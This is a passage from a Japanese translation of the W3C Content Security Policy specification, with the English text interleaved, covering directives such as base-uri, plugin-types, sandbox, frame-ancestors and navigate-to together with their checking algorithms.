This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
］：
◎
If request’s destination is one of "serviceworker", "sharedworker", or "worker":
</p>

		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
			</section>
		</section>
		<section id="directives-document">
<h3 title="Document Directives">6.2. 文書~指令</h3>

<p>
この節の指令は、施策が適用される［
文書／~worker
］環境の~propを統治する。
◎
The following directives govern the properties of a document or worker environment to which a policy applies.
</p>

			<section id="directive-base-uri">
<h4 title="base-uri">6.2.1. `base-uri^dir</h4>

<p>
`base-uri@dir
指令は、`文書$の `base$e 要素に利用できる`~URL$を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The base-uri directive restricts the URLs which can be used in a Document's base element. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "base-uri"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
次の~algoは、この指令を
監視する／施行する
ために，［
~HTMLの，`凍結~基底~URLを設定する$~algo
］から~callされる：
◎
The following algorithm is called during HTML’s set the frozen base url algorithm in order to monitor and enforce this directive:
</p>



				<section id="allow-base-for-document">
<h5 title="Is base allowed for document?">6.2.1.1. %文書 に対する %基底 は許容されるか？</h5>

<p>
次の~algoは、
( `~URL$ %基底, `文書$ %文書 )
が与えられた下で，［
%基底 を `base$e 要素の `href$a 属性の値として利用できるならば `許容ed^i ／
~ELSE_ `阻止ed^i
］を返す：
◎
Given a URL (base), and a Document (document), this algorithm returns "Allowed" if base may be used as the value of a base element’s href attribute, and "Blocked" otherwise:
</p>

<ol>
	<li>
<p>
%文書 の`大域~obj$の`~CSP~list$gO内の
~EACH( %施策 )
に対し：
◎
For each policy in document’s global object’s csp list:
</p>

		<ol>
			<li>
%~source~list ~LET ~NULL
◎
Let source list be null.
</li>
			<li>
~IF［
%施策 の`指令~集合$内に［
`名前$ ~EQ `base-uri^l
］なる`指令$はある
］
⇒
%~source~list ~SET その`指令$の`値$
◎
If a directive whose name is "base-uri" is present in policy’s directive set, set source list to that directive’s value.
</li>
			<li>
~IF［
%~source~list ~EQ ~NULL
］
⇒
~CONTINUE
◎
If source list is null, skip to the next policy.
</li>
			<li>
<p>
~IF［
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %基底, %~source~list, %文書 の`~fallback基底~URL$の`生成元$url )
~EQ `非合致^i
］：
◎
If the result of executing §6.6.1.5 Does url match source list in origin with redirect count? on base, source list, document’s fallback base URL’s origin, and 0 is "Does Not Match":
</p>
				<ol>
					<li>
%違反 ~LET `新たな違反~obj$A1(
%文書 の`大域~obj$, %施策, `base-uri$dir
)
◎
Let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on document’s global object, policy, and "base-uri".
</li>
					<li>
%違反 の`資源$vr ~SET `inline^l
◎
Set violation’s resource to "inline".
</li>
					<li>
`違反を報告する$A( %違反 )
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
~RET `阻止ed^i
◎
If policy’s disposition is "enforce", return "Blocked".
</li>
				</ol>
			</li>
		</ol>
<p class="note">注記：
ここで~fallback基底~URLと比較するのは、不透明な生成元の中へ~sandbox化された`~iframe-srcdoc文書$などを正しく扱うためである。
◎
Note: We compare against the fallback base URL in order to deal correctly with things like an iframe srcdoc Document which has been sandboxed into an opaque origin.
</p>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-plugin-types">
<h4 title="plugin-types">6.2.2. `plugin-types^dir</h4>

<p>
`plugin-types@dir
指令は、読込める資源の型を制限することにより，文書の中に埋込める~pluginの集合を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The plugin-types directive restricts the set of plugins that can be embedded into a document by limiting the types of resources which can be loaded. The directive’s syntax is described by the following ABNF grammar:
</p>


<pre class="ABNF">
`directive-name$p  = "plugin-types"
`directive-value$p = `media-type-list$p

`media-type-list@p = `media-type$p *( `RWS$P `media-type$p )
`media-type@p = `type$p "/" `subtype$p
; type and subtype are defined in RFC 2045
</pre>

<p>
`plugin-types^dir 指令が在する場合、
`embed$e ／ `object$e
要素の~instance化は、次のいずれかの条件が満たされるならば失敗することになる：
◎
If a plugin-types directive is present, instantiation of an embed or object element will fail if any of the following conditions hold:
</p>

<ol>
	<li>
要素は、 `type$a 属性を介して，`妥当な~MIME型$を明示的に宣言していない。
◎
The element does not explicitly declare a valid MIME type via a type attribute.
</li>
	<li>
宣言された型は指令の値~内の どの~itemにも合致しない。
◎
The declared type does not match one of the items in the directive’s value.
</li>
	<li>
~fetchされた資源は、宣言された型に合致しない。
◎
The fetched resource does not match the declared type.
</li>
</ol>

<div class="example">

<p>
次の~CSPを伴う~pageが与えられた場合:
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `plugin-types$dir application/pdf
</pre>


<p>
次のいずれの~codeによる~fetchも，~network~errorになる：
◎
Fetches for the following code will all return network errors:
</p>


<pre class="html-code">
&lt;!-- <span class="comment">
`type^a 宣言がない
◎
No 'type' declaration
</span> --&gt;
&lt;object
    data="https://example.com/flash"
&gt;&lt;/object&gt;

&lt;!-- <span class="comment">
`type^a 宣言が合致しない
◎
Non-matching 'type' declaration
</span> --&gt;
&lt;object
    data="https://example.com/flash"
    type="application/x-shockwave-flash"
&gt;&lt;/object&gt;

&lt;!-- <span class="comment">
資源が合致しない
◎
Non-matching resource
</span> --&gt;
&lt;object
    data="https://example.com/flash"
    type="application/pdf"
&gt;&lt;/object&gt;
</pre>


<p>
~pageが次の~headerを送信して
Flash 内容を許容した場合：
◎
If the page allowed Flash content by sending the following header:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `plugin-types$dir application/x-shockwave-flash
</pre>


<p>
上の二番目の~itemは、成功裡に読込まれる：
◎
Then the second item above would load successfully:
</p>


<pre class="html-code">
&lt;!-- <span class="comment">
`type^a 宣言, 資源の両者とも合致する
◎
Matching 'type' declaration and resource
</span> --&gt;
&lt;object
    data="https://example.com/flash"
    type="application/x-shockwave-flash"
&gt;&lt;/object&gt;
</pre>

</div>



				<section id="plugin-types-post-request-check">
<h5 title="plugin-types Post-Request Check">6.2.2.1. `plugin-types^dir 要請後~検査</h5>


<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check algorithm is as follows:
</p>


<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN { `object^l, `embed^l }
］：
◎
If request’s destination is either "object" or "embed":
</p>

		<ol>
			<li>
%型 ~LET `~MIME型を抽出する$A( %応答 の`~header~list$rs )
◎
Let type be the result of extracting a MIME type from response’s header list.
</li>
			<li>
~IF［
%型 ~NIN`~ACI$ この指令の`値$
］
⇒
~RET `阻止ed^i
◎
If type is not an ASCII case-insensitive match for any item in this directive’s value, return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
				<section id="should-plugin-element-be-blocked-a-priori-by-content-security-policy">
<h5 title="Should plugin element be blocked a priori by Content Security Policy?:">6.2.2.2. %~plugin要素 は~CSPにより先天的に阻止されるべきか？</h5>


<p>
この~algoは、所与の`要素$ %~plugin要素 に対し，［
%~plugin要素 の `type^a 属性と
%~plugin要素 が属する文書に適用されている施策
］に基づいて，［
`阻止ed^i または `許容ed^i
］を返す
◎
Given an Element (plugin element), this algorithm returns "Blocked" or "Allowed" based on the element’s type attribute and the policy applied to its document:
</p>

<ol>

	<li>
<p>
%~plugin要素 の`~node文書$の`~CSP~list$doc内の
~EACH( %施策 )
に対し：
◎
For each policy in plugin element’s node document’s CSP list:
</p>

		<ol>
			<li>
<p>
~IF［
%施策 内に［
`名前$ ~EQ `plugin-types$dir
］なる`指令$ %指令 はある
］：
◎
If policy contains a directive (directive) whose name is plugin-types:
</p>

				<ol>
					<li>
%型 ~LET ［
%~plugin要素 は `applet$e 要素である ならば `application/x-java-applet^l ／
~ELSE_ %~plugin要素 は `type^a 属性を有するならば その値 ／
~ELSE_ `null^l
］
◎
Let type be "application/x-java-applet" if plugin element is an applet element, or plugin element’s type attribute’s value if present, or "null" otherwise.
</li>
					<li>
<p>
~IF［
次のいずれかが満たされる
］
⇒
~RET `阻止ed^i：
◎
Return "Blocked" if any of the following are true:
</p>

						<ol>
							<li>
%型 ~EQ `null^l
◎
type is null.
</li>
							<li>
%型 は`妥当な~MIME型$でない
◎
type is not a valid MIME type.
</li>
							<li>
%型 ~NIN`~ACI$ %指令 の`値$
◎
type is not an ASCII case-insensitive match for any item in directive’s value.
</li>
						</ol>
					</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>
				</section>
			</section>
			<section id="directive-sandbox">
<h4 title="sandbox">6.2.3. `sandbox^dir</h4>

<p>
`sandbox@dir
指令は、［
その値が `iframe$e の `sandbox$a 属性の値に含められていた
］かのように，~UAが資源に適用することになる~HTML~sandbox施策を指定する。
◎
The sandbox directive specifies an HTML sandbox policy which the user agent will apply to a resource, just as though it had been included in an iframe with a sandbox property.
</p>

<p>
この指令の名前と値の構文は、次の`~ABNF$で述べられる。
加えて，その各 `token^p 値は、
`HTML$r により［
`iframe$e の `sandbox$a 属性に許容される値
］として定義される，いずれかの~keywordで~MUST：
◎
The directive’s syntax is described by the following ABNF grammar, with the additional requirement that each token value MUST be one of the keywords defined by HTML specification as allowed values for the iframe sandbox attribute [HTML].
</p>

<pre class="ABNF">
`directive-name$p  = "sandbox"
`directive-value$p = "" / `token$p *( `RWS$P `token$p )
</pre>

<p>
この指令には、報告-法の要件はない
— この指令が［
`Content-Security-Policy-Report-Only$h ~header内で送達された ／
`meta$e 要素の中にある
］ときは、まるごと無視されることになる。
◎
This directive has no reporting requirements; it will be ignored entirely when delivered in a Content-Security-Policy-Report-Only header, or within a meta element.
</p>



				<section id="sandbox-response">
<h5 title="sandbox Response Check">6.2.3.1. `sandbox^dir 応答~検査</h5>

<p>
次の~algoが、この指令の`応答~検査$Aを与える：
◎
This directive’s response check algorithm is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%応答 は利用されない。
◎
Assert: response is unused.
</li>
	<li>
~IF［
%施策 の`処置先$ ~NEQ `enforce^l
］
⇒
~RET `許容ed^i
◎
If policy’s disposition is not "enforce", then return "Allowed".
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
］：
◎
If request’s destination is one of "serviceworker", "sharedworker", or "worker":
</p>

<ol>
	<li>
%出力 ~LET この指令の`値$を入力に，`~sandbox法~指令を構文解析-$した結果
◎
↓</li>
	<li>
<p>
~IF［
`閲覧文脈~sandbox化( ~script )~flag$ ~IN %出力
］~OR［
`閲覧文脈~sandbox化( 生成元 )~flag$ ~IN %出力
］
⇒
~RET `阻止ed^i
◎
If the result of the Parse a sandboxing directive algorithm using this directive’s value as the input contains either the sandboxed scripts browsing context flag or the sandboxed origin browsing context flag flags, return "Blocked".
</p>

<p class="note">注記：
この段は、~workerを一意な生成元<!-- ＊ -->の中に~sandbox化できるようにした場合には，変更する必要がある。
そうするのは、相当に理に適うものに見える。
◎
Note: This will need to change if we allow Workers to be sandboxed into unique origins, which seems like a pretty reasonable thing to do.
</p>
			</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="sandbox-init">
<h5 title="sandbox Initialization">6.2.3.2. `sandbox^dir 初期化</h5>

<p>
次の~algoが、この指令の`初期化$Aを与える。
それは、その施策~内に `sandbox$dir 値が在するかどうかに則って，`文書$の`強制~sandbox法~flag集合$を次に従って調整する責を負う：
◎
This directive’s initialization algorithm is responsible for adjusting a Document's forced sandboxing flag set according to the sandbox values present in its policies, as follows:
</p>

<p>
所与の
( `文書$または`大域~obj$ %文脈, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a Document or global object (context), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%応答 は利用されない。
◎
Assert: response is unused.
</li>
	<li>
<p>
~IF［
%施策 の`処置先$ ~NEQ `enforce^l
］~OR［
%文脈 は`文書$でない
］
⇒
~RET
◎
If policy’s disposition is not "enforce", or context is not a Document, then abort this algorithm.
</p>

<p class="note">注記：
この段は、~workerを~sandbox化できるようにした場合には，変更する必要がある。
そうするのは、相当に理に適うものに見える。
◎
Note: This will need to change if we allow Workers to be sandboxed, which seems like a pretty reasonable thing to do.
</p>
	</li>
	<li>
この指令の`値$を入力に,
%文脈 の`強制~sandbox法~flag集合$を出力とする下で，
`~sandbox法~指令を構文解析-$する
◎
Parse a sandboxing directive using this directive’s value as the input, and context’s forced sandboxing flag set as the output.
</li>
</ol>

				</section>
			</section>

			<section id="directive-disown-opener" class="wip">
<h4 title="disown-opener">6.2.4. `disown-opener^dir</h4>

<p>
`disown-opener@dir
指令は、［
~navigateされた資源【を呈示する閲覧文脈】の`未所有化~flag$が ~ON にされる
］ことを確保する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The disown-opener directive ensures that a resource will disown its opener when navigated to. The directive’s syntax is described by the following ABNF grammar:
</p>

<pre class="ABNF">
`directive-name$p  = "disown-opener"
`directive-value$p = ""
</pre>

<p>
この指令には、報告-法の要件はない
— この指令が［
`Content-Security-Policy-Report-Only$h ~header内で送達された ／
`meta$e 要素の中にある
］ときは、まるごと無視されることになる。
◎
This directive has no reporting requirements; it will be ignored entirely when delivered in a Content-Security-Policy-Report-Only header, or within a meta element.
</p>

<p class="issue">
この~modelが正当かどうかは確かでない。
<a href="https://github.com/w3c/webappsec/issues/139">その逆</a>
も~careされることを確保する必要がある
— 文書を開いた側（ `opener^en ）, 開かれた側（ `openee^en ）の両者とも包摂するような、もっと上手い構文があるかもしれない。
`disown-openee^dir は変だ。
`disown 'opener' 'openee'^P
はどうか？
生成元の制約は、片方または両方に課す必要はあるのか？
◎
Not sure this is the right model. We need to ensure that we take care of the inverse as well, and there might be a cleverer syntax that could encompass both a document’s opener, and a document’s openees. disown-openee is weird. Maybe disown 'opener' 'openee'? Do we need origin restrictions on either/both?
</p>

				<section id="disown-opener-init">
<h5 title="disown-opener Initialization">6.2.4.1. `disown-opener^dir 初期化</h5>

<p>
次の~algoが、この指令の`初期化$Aを与える：
◎
This directive’s initialization algorithm is as follows:
</p>

<p>
所与の
( `文書$または`大域~obj$ %文脈, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a Document or global object (context), a response (response), and a policy (policy):
</p>


<ol>
	<li>
~Assert：
%応答, %施策 は利用されない。
◎
Assert: response and policy are unused.
</li>
	<li>
~IF［
%文脈 の`担当の閲覧文脈$enVを`開いた閲覧文脈$はある
］
⇒
%文脈 の`未所有化~flag$ ~SET ~ON
◎
If context’s responsible browsing context has an opener browsing context, disown its opener.
</li>
</ol>

<p class="issue">
これは `iframe$e 内では何をする？
何かある？
◎
What should this do in an iframe? Anything?
</p>



				</section>
			</section>
		</section>
		<section id="directives-navigation">
<h3 title="Navigation Directives">6.3. ~navi指令</h3>

			<section id="directive-form-action">
<h4 title="form-action">6.3.1. `form-action^dir</h4>

<p>
`form-action@dir
指令は、所与の文脈からの~form提出の~targetとして利用できる`~URL$を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The form-action directive restricts the URLs which can be used as the target of a form submissions from a given context. The directive’s syntax is described by the following ABNF grammar:
</p>


<pre class="ABNF">
`directive-name$p  = "form-action"
`directive-value$p = `serialized-source-list$p
</pre>


				<section id="form-action-pre-navigate">
<h5 title="form-action Pre-Navigation Check">6.3.1.1. `form-action^dir ~navi前~検査</h5>


<p>
次の~algoが、この指令の`~navi前~検査$Aを与える：
それは、所与の
( 
`要請$ %要請,
文字列 %~navi種別,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target,
`施策$ %施策
)
に対し，［
%~target のいずれかの先祖が
応答に伴って送達されてきた `frame-ancestors^dir 指令に違反するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (request), a string navigation type ("form-submission" or "other"), two browsing contexts (source and target), and a policy (policy) this algorithm returns "Blocked" if one or more of the ancestors of target violate the frame-ancestors directive delivered with the response, and "Allowed" otherwise. This constitutes the form-action' directive’s pre-navigation check:
</p>

<ol>
	<li>
~Assert：
%~navi種別 ~IN { `form-submission^l, `other^l }
◎
↑</li>
	<li>
~Assert：
%~source, %~target, %施策 は、この~algoには利用されない
— `form-action^dir が懸念するのは、外向けの要請の詳細~に限られるので。
◎
Assert: source, target, and policy are unused in this algorithm, as form-action is concerned only with details of the outgoing request.
</li>
	<li>
<p>
~IF［
%~navi種別 ~EQ `form-submission^l
］：
◎
If navigation type is "form-submission":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>
				</section>
			</section>
			<section id="directive-frame-ancestors">
<h4 title="frame-ancestors">6.3.2. `frame-ancestors^dir</h4>

<p>
`frame-ancestors@dir
指令は、［
`frame$e／`iframe$e／`object$e／`embed$e／`applet$e
］要素を利用して埋込める資源の`~URL$を制約する。
この指令を利用すれば、敵対的になり得る文脈の中に資源が埋込まれる~riskを避けることで、多くの `UI Redressing^en 【 UI の着せ替え】 攻撃 `UISECURITY$r を避けれるようになる。
◎
The frame-ancestors directive restricts the URLs which can embed the resource using frame, iframe, object, embed, or applet element. Resources can use this directive to avoid many UI Redressing [UISECURITY] attacks, by avoiding the risk of being embedded into potentially hostile contexts.
</p>

<p>
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The directive’s syntax is described by the following ABNF grammar:
</p>

<pre class="ABNF">
`directive-name$p  = "frame-ancestors"
`directive-value$p = `ancestor-source-list$p

`ancestor-source-list@p
              = ( `ancestor-source$p *( `RWS$P `ancestor-source$p) )
              / "`none$pl"
`ancestor-source@p
              = `scheme-source$p
              / `host-source$p
              / "`self$pl"
</pre>

<p>
`meta$e 要素を介して宣言された施策~内に包含されている `frame-ancestors^dir 指令は、無視され~MUST。
◎
The frame-ancestors directive MUST be ignored when contained in a policy declared via a meta element.
</p>

<p class="note">注記：
`frame-ancestors^dir 指令は、構文は`~source~list$に類似するが，
`default-src^dir 指令が指定されていても その値に~fall-backしない。
すなわち、施策が
<samp>`default-src^dir `none$pl</samp>
を宣言していても、依然として，資源はどこからでも埋込まれることが許容される。
◎
Note: The frame-ancestors directive’s syntax is similar to a source list, but frame-ancestors will not fall back to the default-src directive’s value if one is specified. That is, a policy that declares default-src 'none' will still allow the resource to be embedded by anyone.
</p>



				<section id="frame-ancestors-navigation-response">
<h5 title="frame-ancestors Navigation Response Check">6.3.2.1. `frame-ancestors^dir ~navi応答~検査</h5>

<p>
次の~algoが、この指令の`~navi応答~検査$Aを与える：
それは、所与の (
`要請$ %要請,
文字列 %~navi種別,
`応答$ %~navi応答,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target,
文字列 %検査~種別,
`施策$ %施策
) に対し，［
%~target のいずれかの先祖が応答に伴って送達されてきた `frame-ancestors^dir 指令に違反するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (request), a string navigation type ("form-submission" or "other"), a response (navigation response) two browsing contexts (source and target), a string check type ("source" or "response"), and a policy (policy) this algorithm returns "Blocked" if one or more of the ancestors of target violate the frame-ancestors directive delivered with the response, and "Allowed" otherwise. This constitutes the frame-ancestors directive’s navigation response check:
</p>

<ol>
	<li>
~Assert
⇒＃
%~navi種別 ~IN { `form-submission^l, `other^l },
%検査~種別 ~IN { `source^l, `response^l }
◎
↑</li>
	<li>
~Assert：
［
%要請, %~navi応答, %~navi種別, %~source, %施策
］は，この~algoには利用されない
— `frame-ancestors^dir が懸念するのは、 %~navi応答 の `frame-ancestors$dir `指令$に限られるので。
◎
Assert: request, navigation response, navigation type, source, and policy are unused in this algorithm, as frame-ancestors is concerned only with navigation response’s frame-ancestors directive.
</li>
	<li>
<p>
~IF［
%検査~種別 ~EQ `source^l
］
⇒
~RET `許容ed^i
◎
If check type is "source", return "Allowed".
</p>

<p class="note">注記：
`frame-ancestors^dir `指令$が関連するのは、 %~target `閲覧文脈$に限られ， %~source `閲覧文脈$に対する影響0はない。
◎
Note: The 'frame-ancestors' directive is relevant only to the target browsing context and it has no impact on the source browsing context.
</p>
	</li>
	<li>
<p>
~WHILE %~target には`親~閲覧文脈$ %親 がある
◎
If target is not a nested browsing context, return "Allowed".
◎
Let current be target.
◎
While current has a parent browsing context (parent):
</p>

		<ol>
			<li>
%~target ~SET %親
◎
Set current to parent.
</li>
			<li>
%生成元 ~LET `~URL構文解析する$( `生成元を直列化する$( %親 にて`作動中の文書$に`関連する設定群~obj$の`生成元$enV ) )
◎
Let origin be the result of executing the URL parser on the ASCII serialization of parent’s active document’s relevant settings object’s origin.
</li>
			<li>
~IF［
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %生成元, この指令の`値$, %~navi応答 の`~url$rsの`生成元$url, 0 )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If §6.6.1.5 Does url match source list in origin with redirect count? returns Does Not Match when executed upon origin, this directive’s value, navigation response’s url’s origin, and 0, return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
				<section id="frame-ancestors-and-frame-options">
<h5 title="Relation to X-Frame-Options ">6.3.2.2. `X-Frame-Options^h との関係</h5>

<p>
この指令は、いくつかの~UAが実装した
`X-Frame-Options^h ~headerに類似する。
その~headerに対する［
値 `DENY^c は~source式 `none$pl ／
値 `SAMEORIGIN^c は `self$pl
］に概ね等価になる，等々。
主な相違は、多くの~UAが［
~top-level文書の所在に対してのみ照合される，値 `SAMEORIGIN^c
］を実装しているが、
`frame-ancestors$dir 指令は，各~先祖を検査する点にある。
先祖のうち一つでも合致しないものがあれば、読込みは取消される。
`RFC7034$r
◎
This directive is similar to the X-Frame-Options header that several user agents have implemented. The 'none' source expression is roughly equivalent to that header’s DENY, 'self' to SAMEORIGIN, and so on. The major difference is that many user agents implement SAMEORIGIN such that it only matches against the top-level document’s location, while the frame-ancestors directive checks against each ancestor. If _any_ ancestor doesn’t match, the load is cancelled. [RFC7034]
</p>

<p>
後方互換な配備を可能にするため、 `frame-ancestors$dir 指令は， `X-Frame-Options^h ~headerを廃用にする。
［
名前 `frame-ancestors$dir の`指令$を含む`施策$
］を伴って送達されてきた資源に対しては、［
その`処置先$ ~EQ `enforce^l
］の場合には，
`X-Frame-Options^h ~headerは無視され~MUST。
◎
In order to allow backwards-compatible deployment, the frame-ancestors directive _obsoletes_ the X-Frame-Options header. If a resource is delivered with an policy that includes a directive named frame-ancestors and whose disposition is "enforce", then the X-Frame-Options header MUST be ignored.
</p>


<p class="issue">
これを、`~navigate応答を処理する$A~algoにおける `X-Frame-Options^h の統合を定義する一部として，もっと詳細に書き記す。
<a href="~HTMLissue/1230">&lt;~HTMLissue/1230&gt;</a>
◎
Spell this out in more detail as part of defining X-Frame-Options integration with the process a navigate response algorithm. &lt;https://github.com/whatwg/html/issues/1230&gt;
</p>

				</section>
			</section>
			<section id="directive-navigate-to">
<h4 title="navigate-to">6.3.3. `navigate-to^dir</h4>

<p>
`navigate-to@dir
指令は、`文書$が何らかの手段（
`a$e, `form$e, `window.location^c, `window.open^c, 等々
）で~naviを起動できる`~URL$を制約する。
これは、［
この`文書$が起動する~navi
］に対する施行であり，［
この`文書$は どこへ~navigateされるのが許容されるか
］ではない。
また， `form-action$dir 指令が在する場合、この指令は，~form提出である~naviには動作しない。
◎
The navigate-to directive restricts the URLs to which a document can initiate navigations by any means (a, form, window.location, window.open, etc.). This is an enforcement on what navigations this document initiates not on what this document is allowed to navigate to. If the form-action directive is present, the navigate-to directive will not act on navigations that are form submissions.
</p>

<div class="example">

<p>
`文書$ %起動元 には 次の~CSPが与えられていて：
◎
A document initiator has the following Content-Security-Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `navigate-to^dir example.com
</pre>

<p>
`文書$ %~target には 次の~CSPが与えられていたといする：
◎
A document target has the following Content-Security-Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `navigate-to^dir not-example.com
</pre>

<p>
%起動元 が %~target を［
`example.com^s ／ `not-example.com^s
］へ~navigateしようと試みた場合、【前者の】 `navigate-to^dir 指令は，その~naviを［
許容する ／ 阻止する
］。
◎
If the initiator attempts to navigate the target to example.com, the navigation is allowed by the navigate-to directive.
◎
If the initiator attempts to navigate the target to not-example.com, the navigation is blocked by the navigate-to directive.
</p>

</div>

<p>
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The directive’s syntax is described by the following ABNF grammar:
</p>

<pre class="ABNF">
`directive-name$p  = "navigate-to"
`directive-value$p = `serialized-source-list$p
</pre>

				<section id="navigate-to-pre-navigate">
<h5 title="navigate-to Pre-Navigation Check">6.3.3.1.  `navigate-to^dir ~navi前~検査</h5>


<p>
次の~algoが、この指令の`~navi前~検査$Aを与える：
それは、所与の
( 
`要請$ %要請,
文字列 %~navi種別,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target,
`施策$ %施策
)
に対し，［
当の~naviが `navigate-to$dir 指令に違反するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (request), a string navigation type ("form-submission" or "other"), two browsing contexts (source and target), and a policy (policy), this algorithm returns "Blocked" if the navigation violates the navigate-to directive’s constraints, and "Allowed" otherwise. This constitutes the navigate-to' directive’s pre-navigation check:
</p>

<ol class="algorithm">
	<li>
~Assert：
%~navi種別 ~IN { `form-submission^l, `other^l }
◎
↑</li>
	<li>
~Assert：
%~source, %~target は利用されない
— `navigate-to^dir が懸念するのは、要請の詳細~に限られるので。
◎
Assert: source and target are unused as 'navigate-to' is concerned with the details of the request.
</li>
	<li>
~IF［
%~navi種別 ~EQ `form-submission^l
］~AND［
%施策 【の`指令~集合$】内に［
`名前$ ~EQ `form-action$dir
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If navigation type is "form-submission" and policy contains a directive named "form-action", return "Allowed".
</li>
	<li>
<p>
~IF［
この指令の`値$は［
`~source式$ ~EQ`~ACI$ `unsafe-allow-redirects$pl
］を包含する
］
⇒
~RET `許容ed^i
◎
If this directive’s value contains a source expression that is an ASCII case-insensitive match for the "'unsafe-allow-redirects'" keyword-source, return "Allowed".
</p>

<p class="note">注記：
`unsafe-allow-redirects^pl ~flagが在する場合、`応答$を待機した上で，
<a href="#navigate-to-navigation-response">`navigate-to^dir ~navi応答~検査</a>
にて`応答$の`~status$rsを織り込む必要がある。
◎
Note: If the 'unsafe-allow-redirects' flag is present we have to wait for the response and take into account the response’s status in §6.3.3.2 navigate-to Navigation Response Check.
</p>
	</li>
	<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="navigate-to-navigation-response">
<h5 title="navigate-to Navigation Response Check">6.3.3.2. `navigate-to^dir ~navi応答~検査</h5>

<p>
次の~algoが、この指令の`~navi応答~検査$Aを与える：
それは、所与の (
`要請$ %要請,
文字列 %~navi種別,
`応答$ %~navi応答
`閲覧文脈$ %~source,
`閲覧文脈$ %~target,
文字列 %検査~種別,
`施策$ %施策
) に対し，［
当の~naviは `navigate-to$dir 指令による拘束に違反するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (request), a string navigation type ("form-submission" or "other"), a response (navigation response) two browsing contexts (source and target), a string check type ("source" or "response"), and a policy (policy), this algorithm returns "Blocked" if the navigation violates the navigate-to directive’s constraints, and "Allowed" otherwise. This constitutes the navigate-to directive’s navigation response check:
</p>

<ol class="algorithm">
	<li>
~Assert：
%~source, %~target は利用されない。
◎
Assert: source, and target are unused.
</li>
	<li>
<p>
~IF［
%検査~種別 ~EQ `response^l
］
⇒
~RET `許容ed^i
◎
If check type is "response", return "Allowed".
</p>

<p class="note">注記：
`navigate-to^dir `指令$が関連するのは、 %~source `閲覧文脈$に限られ， %~target `閲覧文脈$に対する影響0はない。
◎
Note: The 'navigate-to' directive is relevant only to the source browsing context and it has no impact on the target browsing context.
</p>
	</li>
	<li>
~IF［
%~navi種別 ~EQ `form-submission^l
